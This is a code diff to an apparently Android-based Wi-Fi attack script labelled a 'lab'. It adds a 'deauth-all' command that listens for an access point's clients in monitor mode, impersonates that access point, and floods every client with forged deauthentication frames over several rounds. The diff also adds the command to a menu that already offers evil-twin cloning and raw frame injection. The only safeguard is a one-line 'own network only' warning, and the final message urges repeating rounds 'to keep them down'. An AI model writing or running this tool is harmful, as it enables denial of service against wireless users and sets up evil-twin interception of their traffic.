@@ -335,6 +335,61 @@ cmd_status() {
     done
 }
 
+# act_deauth_all <ap-bssid> <freq> [listen-secs] [rounds] [interval]
+# phase 1: monitor census on the channel, correlating clients of the AP
+# phase 2: AP-role on the same channel (unassociated)
+# phase 3: forged deauth to every client found, N rounds
+act_deauth_all() {
+    apb=$(flat "${1:?usage: lab deauth-all <ap-bssid> <freq> [listen-secs] [rounds] [interval]}")
+    freq=${2:?usage: lab deauth-all <ap-bssid> <freq> [listen-secs] [rounds] [interval]}
+    listen=${3:-15}
+    rounds=${4:-1}
+    interval=${5:-0.3}
+    clf="$P/.lab_clients_$apb"
+
+    hdr "phase 1: listening ${listen}s on $freq for clients of $1"
+    cmd wifi stop-softap >/dev/null 2>&1
+    svc wifi disable
+    sleep 1
+    echo 4 > /sys/module/qca6490/parameters/con_mode
+    "$P/nl80211_probe" del mon0 >/dev/null 2>&1
+    "$P/nl80211_probe" addmon mon0 >/dev/null 2>&1 || true
+    sleep 6
+    ip link set wlan0 up 2>/dev/null
+    printf '%s 0\n' "$freq" > /sys/class/net/wlan0/monitor_mode_channel 2>/dev/null
+    "$P/mon_capture" wlan0 "$listen" - "$apb" "$clf"
+
+    echo 0 > /sys/module/qca6490/parameters/con_mode
+    gates_all_off
+    svc wifi enable
+    sleep 6
+
+    if [ ! -s "$clf" ]; then
+        err "no clients of this AP seen on the channel - nothing to kick"
+        return 1
+    fi
+    ok "clients found: $(wc -l < "$clf")"
+    sed 's/^/      /' "$clf"
+
+    hdr "phase 2: AP role on $freq (impersonating $1)"
+    act_ap_up "$freq" LabAP labpass123
+
+    hdr "phase 3: mass deauth x$rounds rounds"
+    i=0
+    while [ "$i" -lt "$rounds" ]; do
+        for c in $(cat "$clf"); do
+            send_frame "$freq" "c0000000${c}${apb}${apb}00000700"
+            sleep "$interval"
+        done
+        i=$((i + 1))
+        say "round $i/$rounds done"
+        [ "$i" -lt "$rounds" ] && sleep 1
+    done
+    sleep 2
+    show_counters
+    say "clients will reconnect on their own; repeat rounds to keep them down"
+}
+
 # ============================================================
 #  guided flows
 # ============================================================
@@ -346,6 +401,7 @@ flow_attack_menu() {
         echo "   3) evil twin - clone this SSID on this channel"
         echo "   4) monitor - capture on this channel"
         echo "   5) raw data frame (needs connected STA)"
+        echo "   6) deauth ALL clients of this AP (census + mass kick)"
         echo "   0) back"
         ask "action: "
         read act || act=0
@@ -396,6 +452,13 @@ flow_attack_menu() {
             read hx || hx=""
             [ -z "$hx" ] && continue
             act_data "$T_FREQ" "$hx"
+            ;;
+        6)
+            warn "this kicks every client seen on ${T_BSSID} - own network only"
+            ask "listen seconds [15]: "; read ls_ || ls_=""
+            ask "rounds [1]: "; read r || r=""
+            ask "interval sec [0.3]: "; read iv || iv=""
+            act_deauth_all "$T_BSSID" "$T_FREQ" "${ls_:-15}" "${r:-1}" "${iv:-0.3}"
             ;;
         0|q) break ;;
         esac
@@ -462,6 +525,8 @@ cmd_help() {
     echo "    eviltwin <ssid> <pass> <freq>   clone an SSID on a channel"
     echo "    mgmt <freq> <hex>               raw management frame"
     echo "    data <freq> <hex>               raw data frame (v20 DP path)"
+    echo "    deauth-all <apbssid> <freq>     census clients of an AP, then"
+    echo "                 [sec] [rds] [iv]   mass-kick them (AP-role)"
     echo "    monitor <freq> [seconds] [name] true monitor + capture"
     echo "                                    (name given = save Wireshark pcap)"
     echo "    honeypot <ssid> <pass|-> <sec>  repeater: STA up + AP + pcap"
@@ -481,6 +546,7 @@ case "${1:-menu}" in
     eviltwin)     freq=$4; ssid=$2; pass=$3; [ -z "$freq" ] && { err "usage: lab eviltwin <ssid> <pass> <freq>"; exit 1; }; act_ap_up "$freq" "$ssid" "$pass" ;;
     mgmt)         shift; act_mgmt "$@" ;;
     data)         shift; act_data "$@" ;;
+    deauth-all)   shift; act_deauth_all "$@" ;;
     monitor)      shift; act_monitor "$@" ;;
     honeypot)     shift; act_honeypot "$@" ;;
     wifi-restore) gates_all_off; cmd wifi stop-softap >/dev/null 2>&1
